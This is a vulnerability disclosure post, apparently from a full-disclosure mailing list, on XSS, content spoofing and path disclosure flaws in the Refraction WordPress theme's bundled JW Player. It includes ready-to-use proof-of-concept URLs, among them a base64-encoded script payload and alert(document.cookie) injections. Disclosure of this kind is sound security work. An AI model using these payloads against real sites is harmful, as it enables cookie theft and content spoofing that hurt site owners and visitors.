Subject: [FD] Multiple vulnerabilities in Refraction theme for WordPress

Hello list!

In 2012 I've disclosed vulnerabilities in JW Player and in RokBox. Which 
were fixed by the developers - JW Player developers fixed one hole and 
promised to fix others later and RokBox developers fixed all holes (but it 
was questionable how they fixed holes related to JW Player).

In December 2012 I've wrote about 47 RocketTheme's themes for WordPress 
(which contain RokBox). Besides their themes I've found similar 
vulnerabilities in multiple themes of other developers (including custom 
themes).

Now I'll inform you about multiple vulnerabilities in Refraction theme for 
WordPress (there are thousands of web sites with it). These are Cross-Site 
Scripting, Content Spoofing and Full path disclosure vulnerabilities.

The folder of theme can be named refraction or rt_refraction_wp.

-------------------------
Affected products:
-------------------------

Affected all versions of Refraction theme for WordPress (XSS an CS holes are 
fixed in versions of themes with JW Player 6.x).

-------------------------
Affected vendors:
-------------------------

RocketTheme
http://www.rockettheme.com

Cross-Site Scripting (WASC-08):

http://site/wp-content/themes/refraction/js/rokbox/jwplayer/jwplayer.swf?abouttext=Player&aboutlink=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2B

This XSS vulnerability exists only in new version of theme with 5.x version 
of JW Player:

http://site/wp-content/themes/rt_refraction_wp/js/rokbox/jwplayer/jwplayer.swf?playerready=alert(document.cookie)

Content Spoofing (WASC-12):

In parameter file there can be set as video, as audio files.

Swf-file of JW Player accepts arbitrary addresses in parameters file and 
image, which allows to spoof content of flash - i.e. by setting addresses of 
video (audio) and/or image files from other site.

http://site/wp-content/themes/refraction/js/rokbox/jwplayer/jwplayer.swf?file=1.flv&backcolor=0xFFFFFF&screencolor=0xFFFFFF
http://site/wp-content/themes/refraction/js/rokbox/jwplayer/jwplayer.swf?file=1.flv&image=1.jpg

Content Spoofing (WASC-12):

Swf-file of JW Player accepts arbitrary addresses in parameter config, which 
allows to spoof content of flash - i.e. by setting address of config file 
from other site (parameters file and image in xml-file accept arbitrary 
addresses). For loading of config file from other site it needs to have 
crossdomain.xml.

http://site/wp-content/themes/refraction/js/rokbox/jwplayer/jwplayer.swf?config=1.xml

1.xml

<config>
  <file>1.flv</file>
  <image>1.jpg</image>
</config>

Content Spoofing (WASC-12):

http://site/wp-content/themes/refraction/js/rokbox/jwplayer/jwplayer.swf?abouttext=Player&aboutlink=http://site

Full path disclosure (WASC-13):

There are FPD In folder http://site/wp-content/themes/refraction/ 
(http://site/wp-content/themes/rt_refraction_wp/) in index.php and many 
other php-files of theme.
